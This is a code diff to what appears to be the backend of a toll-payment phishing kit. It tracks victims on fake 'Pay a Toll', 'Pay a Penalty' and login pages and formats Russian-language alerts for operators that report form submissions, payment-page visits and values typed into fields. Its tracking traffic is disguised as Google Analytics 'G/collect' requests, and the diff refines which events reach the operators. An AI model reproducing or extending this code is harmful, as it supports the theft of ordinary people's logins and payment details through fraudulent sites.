@@ -405,6 +405,10 @@ function formatSessionMessage(session, sessionId) {
         if (logPath) message += `   └ URL: <code>${logPath}</code>\n`;
         break;
       case 'form_submit':
+        // Skip if page is G/collect or similar tracking endpoints
+        if (logPage && (logPage.includes('G/collect') || logPage.includes('collect') || logPage === 'view')) {
+          break;
+        }
         message += `📤 [${time}] <b>ОТПРАВИЛ ФОРМУ</b> на: ${logPage || 'страница'}\n`;
         break;
       case 'payment_page':
@@ -454,7 +458,13 @@ function formatSessionMessage(session, sessionId) {
         message += `🔘 [${time}] Выбрал: <b>${logField}</b> = <code>${logValue}</code>\n`;
         break;
       default:
-        message += `• [${time}] ${logMessage || logType}\n`;
+        // Skip empty/unknown/tracking events
+        if (logType === 'unknown' || logType === 'view' || !logType) break;
+        if (logMessage && !logMessage.includes('collect')) {
+          message += `• [${time}] ${logMessage}\n`;
+        } else if (logType && logType !== 'unknown') {
+          message += `• [${time}] ${logType}\n`;
+        }
     }
   });
   
@@ -509,6 +519,27 @@ async function trackEvent(sessionId, eventData, meta = {}) {
       return;
     }
     
+    // FILTER: Skip unwanted events
+    const eventType = safeString(eventData.type) || '';
+    const eventPage = safeString(eventData.page) || '';
+    const eventPath = safeString(eventData.path) || '';
+    
+    // Skip tracking endpoint noise
+    if (eventPage.includes('G/collect') || eventPage.includes('collect') || eventPage === 'view') {
+      return;
+    }
+    if (eventPath.includes('/g/collect') || eventPath.includes('collect')) {
+      return;
+    }
+    // Skip empty/unknown events
+    if (eventType === 'unknown' && !eventPage && !eventData.field) {
+      return;
+    }
+    // Skip "view" only events
+    if (eventType === 'view' || eventPage === 'view') {
+      return;
+    }
+    
     let session = sessions.get(sessionId);
     
     if (!session) {
@@ -531,6 +562,7 @@ async function trackEvent(sessionId, eventData, meta = {}) {
     const logEntry = {
       type: safeString(eventData.type) || 'unknown',
       page: safeString(eventData.page),
+      path: safeString(eventData.path),
       field: safeString(eventData.field),
       value: safeString(eventData.value, 100),
       amount: safeString(eventData.amount),
@@ -538,6 +570,11 @@ async function trackEvent(sessionId, eventData, meta = {}) {
       message: safeString(eventData.message),
       time: Date.now(),
     };
+    
+    // Update current page for header display
+    if (logEntry.path && (logEntry.path.includes('pay-') || logEntry.path.includes('login'))) {
+      session.currentPage = logEntry.path;
+    }
     
     // Avoid duplicates within 3 seconds
     const lastLog = session.logs[session.logs.length - 1];
@@ -591,6 +628,11 @@ async function trackPageRequest(req) {
     }
     
     if (path.startsWith('/api/') || path.startsWith('/_') || path === '/__track') {
+      return;
+    }
+    
+    // Skip tracking endpoints
+    if (path.startsWith('/g/collect') || path.includes('collect')) {
       return;
     }
     
@@ -838,10 +880,33 @@ function decodeGAEvent(gaData) {
     mapped.value = ev;
   }
   
-  // For page view, set the page path
+  // For page view, set the page path and proper page name
   if (ec === 'page' && ea === 'view') {
-    mapped.path = ev;
-    mapped.page = getPageNameRu(ev);
+    // el contains page type (pay-toll, pay-penalty, etc.)
+    // ev contains full path
+    if (el) {
+      if (el === 'pay-penalty') {
+        mapped.path = '/pay-penalty';
+        mapped.page = '⚠️ Pay a Penalty (Оплата штрафа)';
+      } else if (el === 'pay-toll') {
+        mapped.path = '/pay-toll';
+        mapped.page = '💰 Pay a Toll (Оплата проезда)';
+      } else if (el === 'login') {
+        mapped.path = '/user/login';
+        mapped.page = '🔐 Вход в аккаунт';
+      } else if (el === 'appeal') {
+        mapped.path = '/appeal';
+        mapped.page = '📋 Апелляция';
+      } else if (el === 'other' && ev) {
+        mapped.path = ev;
+        mapped.page = getPageNameRu(ev);
+      } else {
+        mapped.page = getPageNameRu(el);
+      }
+    }
+    if (ev && !mapped.path) {
+      mapped.path = ev;
+    }
   }
   
   return mapped;
